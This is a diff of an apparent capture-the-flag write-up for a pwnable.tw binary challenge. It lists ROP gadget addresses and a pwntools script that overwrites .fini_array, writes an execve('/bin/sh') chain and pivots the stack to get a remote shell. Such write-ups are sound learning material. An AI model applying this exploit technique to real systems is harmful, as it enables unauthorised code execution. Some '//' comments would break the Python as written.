@@ -45,9 +45,13 @@ With infinite writes secured, we can slowly write our payload directly into the 
 The Arsenal:
 
 pop rdi; ret: 0x401696
+
 pop rsi; ret: 0x406c30
+
 pop rdx; ret: 0x446e35
+
 pop rax; ret: 0x41e4af
+
 syscall: 0x4022b4
 
 We arrange these to set RAX = 59 (execve), RDI = Address of "/bin/sh", RSI = 0, and RDX = 0.
@@ -63,19 +67,29 @@ from time import sleep
 //Target Addresses
 
 fini_array = 0x4b40f0
+
 main_addr  = 0x401b6d
-libc_csu   = 0x402960   
+
+libc_csu   = 0x402960
+
 leave_ret  = 0x401c4b
+
 ret        = leave_ret + 1 
 
 //ROP Gadgets
+
 pop_rdi = 0x00401696
+
 pop_rsi = 0x00406c30
+
 pop_rdx = 0x00446e35
+
 pop_rax = 0x0041e4af
+
 syscall = 0x004022b4
 
 //Connect to target
+
 print("[*] Connecting to chall.pwnable.tw:10105...")
 p = remote('chall.pwnable.tw', 10105)
 
@@ -84,10 +98,12 @@ def write_val(address, data):
     p.sendafter(b"data:", data)
 
 //Establish the Infinite Loop
+
 print("[*] Creating infinite loop via .fini_array overwrite...")
 write_val(fini_array, p64(libc_csu) + p64(main_addr))
 
 //Write ROP chain to memory
+
 print("[*] Writing ROP chain to memory...")
 write_val(fini_array + 16, p64(pop_rdi))
 write_val(fini_array + 24, p64(fini_array + 88)) # Pointer to /bin/sh string
@@ -101,10 +117,12 @@ write_val(fini_array + 80, p64(syscall))
 write_val(fini_array + 88, b"/bin/sh\x00")       
 
 //Stack Pivot
+
 print("[*] Pivoting stack and executing payload...")
 write_val(fini_array, p64(leave_ret) + p64(ret))
 
 //Automate Flag Capture (Bypass Timeout)
+
 print("[*] Payload sent! Waiting for shell to wake up...")
 sleep(1) 
 
